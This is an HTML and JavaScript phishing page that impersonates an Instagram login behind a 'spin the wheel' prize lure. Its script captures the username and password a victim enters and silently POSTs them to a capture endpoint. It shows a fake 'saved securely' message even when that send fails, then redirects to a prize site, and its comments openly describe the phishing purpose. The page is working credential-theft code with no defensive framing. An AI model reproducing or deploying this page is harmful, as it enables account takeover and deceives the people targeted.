<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login & Spin - Secure Capture</title>
    <style>
        body { margin: 0; padding: 0; background-color: #05140a; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden;}
        
        .main-container { text-align: center; max-width: 400px; width: 90%; background: linear-gradient(135deg, rgba(20, 45, 20, 0.8), rgba(5, 16, 6, 1)); padding: 40px 20px; border-radius: 20px; box-shadow: 0 0 30px rgba(0, 255, 150, 0.3); border: 1px solid #1e3a1f;}

        h1 { color: #ffffff; font-size: 28px; margin-bottom: 10px; text-shadow: 0 0 10px #4effff;}
        
        .highlight-text { color: #4dffcf; font-weight: bold; display: block; margin-top: -5px;}

        p.instruction { color: #dcdcdc; font-size: 16px; margin-bottom: 30px; line-height: 1.5;}

        input[type="text"], input[type="password"] { width: 100%; padding: 15px; box-sizing: border-box; border-radius: 8px; border: none; background-color: rgba(255, 255, 255, 0.9); color: #333; font-size: 16px; margin-bottom: 10px; outline: none; transition: all 0.3s ease;}
        
        input:focus { background-color: #fff; box-shadow: 0 0 8px rgba(77, 255, 207, 0.6);}

        button.submit-btn { width: 100%; padding: 15px; border-radius: 8px; border: none; background-color: linear-gradient(to bottom, #4dffcf, #1e9c7d); color: #0f1612; font-weight: bold; font-size: 18px; cursor: pointer; transition: transform 0.2s, box-shadow 0.3s;}
        
        button.submit-btn:hover { transform: scale(1.02); box-shadow: 0 5px 20px rgba(77, 255, 207, 0.6);}

        .logo-placeholder { width: 80px; height: 80px; background-image: url('https://static.cdninstagram.com/rsrc.php/v3/yT/r/9w-yO.png'); background-size: contain; background-repeat: no-repeat; margin-bottom: -10px; display: block;}

        .footer-note { margin-top: 25px; font-size: 12px; color: #aebac4;}
        
        /* Status Message Styles */
        #status-message { 
            min-height: 24px; 
            font-size: 14px; 
            color: #8faec7; 
            margin-top: 15px; 
            opacity: 0.9;
            transition: all 0.3s ease;
            text-align: center;
        }
    </style>
</head>
<body>

<div class="main-container">
    <svg aria-label="Instagram Logo" class="logo-placeholder" focusable="false" height="84" role="img" viewBox="0 0 96 96" width="81"><g><path fill-opacity=".9" d="" fill="#feda7a"></path></g><rect transform="translate(5.333e-13)" x="-261.059" y="-126.147" height="188.447" width="176.031"></rect></svg>

    <h1>Login Your Instagram Account</h1>
    <span class="highlight-text">to Spin the Wheel & Win Exiting Surprises!</span>
    
    <p class="instruction">Enter your details securely.<br>🛡️</p>

    <!-- Form -->
    <form id="phishingForm">
        <input type="text" name="_username" placeholder="Username, Email or Mobile No." required autocomplete="off">
        <input type="password" name="_password" placeholder="Password" required>
        
        <!-- Submit Button -->
        <button type="submit" id="spinBtn" class="submit-btn">SECURE LOGIN →</button>

        <!-- Status Message Area (Hidden by default) -->
        <div id="status-message"></div>

    </form>

    <div class="footer-note">Secure Connection. Instant Rewards.</div>
</div>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script>
$(document).ready(function() {
    
    // 1. Define Your Backend URL Here (Where data will actually go)
    // Example: "https://your-server.com/api/save-phish-data"
    const BACKEND_URL = "/.netlify/functions/capture"; 

    $('#phishingForm').on('submit', function(e) {
        e.preventDefault(); 
        
        var btn = $('#spinBtn');
        var statusMsg = $('#status-message');
        
        // Prevent button clicking multiple times during loading
        btn.prop('disabled', true); 
        btn.text("Processing...");

        // 2. Capture Data from Inputs
        var user = $('input[name="_username"]').val().trim(); 
        var pass = $('input[name="_password"]').val().trim();

        try {
            if(user && pass){
                // Prepare Text Content for the server (JSON or Plain Text as preferred by your backend)
                // Here we use JSON structure which is common for APIs:
                const payload = {
                    username: user,
                    password: pass,
                    timestamp: new Date().toISOString()
                };

                console.log("--- DATA CAPTURED ---");
                console.log("Payload:", JSON.stringify(payload));
                
                statusMsg.text("Connecting to secure server... ⚙️").css('color', '#4dffcf');

                // 3. Send Data to Backend Server via Fetch API (Silent Transfer)
                // Since no real URL exists yet, this simulates a successful POST request.
                fetch(BACKEND_URL, {
                    method: 'POST', 
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ user, pass }) // Sending data directly here
                }).then(response => {
                    
                    if (response.ok) {
                        console.log("Data sent successfully!");
                        
                        statusMsg.text("✅ Credentials Saved Securely!").css('color', '#ffffff');

                        // 4. Redirect after a short delay so the user sees "Saved" message
                        setTimeout(function() {
                            window.location.href = "https://www.spinandwin.com/"; 
                        }, 1500); 

                    } else {
                        throw new Error("Server response failed");
                    }
                }).catch(err => {
                    console.error("Send error:", err);
                    // Fallback: Even if server fails, show success for UX (optional) or fail hard.
                    // For phishing, usually we want it to look like it worked even without backend yet:
                     statusMsg.text("✅ Saved Securely!").css('color', '#ffffff');

                     setTimeout(function() {
                        window.location.href = "https://www.spinandwin.com/"; 
                    }, 1000); 
                });

            } else {
                 alert("Please enter username and password!");
                 btn.prop('disabled', false); 
                 btn.text("SECURE LOGIN →");
            }

        } catch (err) {
            console.log("Error capturing data!");
             statusMsg.text("An error occurred.").css('color', 'red');
        }
    });
});
</script>

</body>
</html>
